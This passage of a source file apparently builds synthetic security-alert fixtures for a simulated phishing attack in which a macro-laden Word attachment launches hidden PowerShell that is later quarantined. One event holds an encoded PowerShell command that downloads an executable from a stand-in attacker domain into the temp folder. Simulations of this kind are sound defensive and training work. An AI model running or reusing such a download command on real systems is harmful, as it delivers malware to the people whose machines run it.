      description: "The EDR raised a high-severity alert on WS-SALES-1876: WINWORD.EXE started powershell.exe with a hidden window and an encoded command; the policy action was detect-only.",
      process: {
        name: "powershell.exe", pid: 7340, parent_name: "WINWORD.EXE", parent_pid: 4512,
        cmdline: "powershell.exe -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AaQBuAHYAbwBpAGMAZQAtAHMAeQBuAGMALQBjAGQAbgAuAHgAeQB6AC8AaQBuAHYALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAaQBuAHYALgBlAHgAZQA=",
        user: "NEXACORP\\s.peretz", integrity: "medium",
      },
      raw: {
        "mde.AlertTitle": "Suspicious PowerShell command line",
        "mde.Category": "Execution",
        "mde.AttackTechniques": "Command and Scripting Interpreter: PowerShell",
        "mde.Techniques": "T1059.001",
        "mde.Severity": "High",
        "mde.DetectionSource": "EDR",
        "mde.Status": "New",
        "host.name": victim.hostname,
        "action_result": "detected",
      },
    },
    {
      // The decoded command is an HTTP (port 80) download of inv.exe, so the
      // firewall sees web-browsing on 80 and logs the file transfer by name.
      id: "evt_macro_03_download", ts: T(8 * MIN + 25_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "http_request",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 80, protocol: "tcp",
      severity: "high", mitre_technique: "T1105",
      network: { url: `http://${c2Domain}/inv.exe`, domain: c2Domain, method: "GET", bytes_out: 412, bytes_in: 286_720 },
      file: { name: "inv.exe", path: "inv.exe", sha256: invHash, size: 284_160 },
      description: "WS-SALES-1876 downloaded inv.exe (Windows executable) over HTTP from invoice-sync-cdn.xyz, a newly registered domain; the firewall allowed the transfer.",
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": victim.ip, "source.port": "55931",
        "destination.ip": c2Ip, "destination.port": "80",
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.application": "web-browsing",
        "pan.app": "web-browsing", "pan.action": "allow",
        "url.full": `http://${c2Domain}/inv.exe`,
        "url.category": "newly-registered-domain",
        "pan.filename": "inv.exe",
        "action_result": "allow",
      },
    },
    {
      id: "evt_macro_03b_drop", ts: T(8 * MIN + 27_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1105",
      file: { path: "C:\\Users\\s.peretz\\AppData\\Local\\Temp\\inv.exe", sha256: invHash, size: 284_160 },
      process: {
        name: "powershell.exe", pid: 7340, parent_name: "WINWORD.EXE", parent_pid: 4512,
        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        user: "NEXACORP\\s.peretz", integrity: "medium",
      },
      description: "powershell.exe on WS-SALES-1876 wrote inv.exe to s.peretz's %TEMP% folder.",
      raw: {
        "crowdstrike.event_simpleName": "NewExecutableWritten",
        "file.path": "C:\\Users\\s.peretz\\AppData\\Local\\Temp\\inv.exe",
        "file.hash.sha256": invHash,
        "host.name": victim.hostname,
        "user.name": "NEXACORP\\s.peretz",
      },
    },
    {
      id: "evt_macro_04_payload_blocked", ts: T(8 * MIN + 29_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1105",
      file: { path: "C:\\Users\\s.peretz\\AppData\\Local\\Temp\\inv.exe", sha256: invHash, size: 284_160 },
      description: "The EDR quarantined inv.exe in %TEMP% on WS-SALES-1876 two seconds after it was written, before any process was started from it.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "threat.name": "Trojan:Win32/Wacatac.B!ml",
        "crowdstrike.Tactic": "Command and Control",
        "crowdstrike.Technique": "Ingress Tool Transfer",
        "threat.technique.id": "T1105",
        "crowdstrike.PatternDispositionDescription": "Prevention, Quarantine File",
        "crowdstrike.SeverityName": "Critical",
        "file.hash.sha256": invHash,
        "host.name": victim.hostname,
        "action_result": "quarantined",
      },
    },
    {
      id: "evt_macro_05_docm_quarantine", ts: T(11 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email,
      severity: "high", mitre_technique: "T1204.002",
      file: { path: docmPath, sha256: docmHash, size: 48210 },
      description: "The EDR quarantined Q3_Client_Invoice_Review.docm in s.peretz's Downloads folder on WS-SALES-1876 (same SHA256 as the email attachment).",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "threat.name": "TrojanDownloader:O97M/Donoff!MTB",
        "crowdstrike.Tactic": "Execution",
        "crowdstrike.Technique": "User Execution: Malicious File",
        "threat.technique.id": "T1204",
        "threat.technique.subtechnique.id": "T1204.002",
        "crowdstrike.PatternDispositionDescription": "Prevention, Quarantine File",
        "crowdstrike.SeverityName": "High",
        "file.hash.sha256": docmHash,
        "host.name": victim.hostname,
        "action_result": "quarantined",
      },
    },
    {
      id: "evt_macro_06_zap", ts: T(12 * MIN),
      source: "o365", vendor: "Microsoft Defender for Office 365", event_type: "email_quarantined",
      user_email: victim.email,
      severity: "medium", mitre_technique: "T1566.001",
      description: "Zero-hour auto purge (ZAP) moved the \"Q3 Invoice Review\" message from s.peretz's inbox to quarantine with a Malware verdict.",
      raw: {
        "InternetMessageId": msgId,
        "email.from.address": "billing@client-invoices-portal.info",
        "email.to.address": victim.email,
        "email.subject": "Q3 Invoice Review — Please Confirm by Friday",
        "email.attachments.file.name": "Q3_Client_Invoice_Review.docm",
        "email.attachments.file.hash.sha256": docmHash,
        "email.direction": "inbound",
        "Action": "Moved to quarantine",
        "ActionTrigger": "ZAP",
        "ActionResult": "Success",
        "ThreatTypes": "Malware",
        "DeliveryLocation": "Quarantine",
      },
    },
  ];

  return { title: "Malicious Office Macro → PowerShell Download Blocked", events, T, MIN, c2Domain, c2Ip, docmHash, invHash };
}
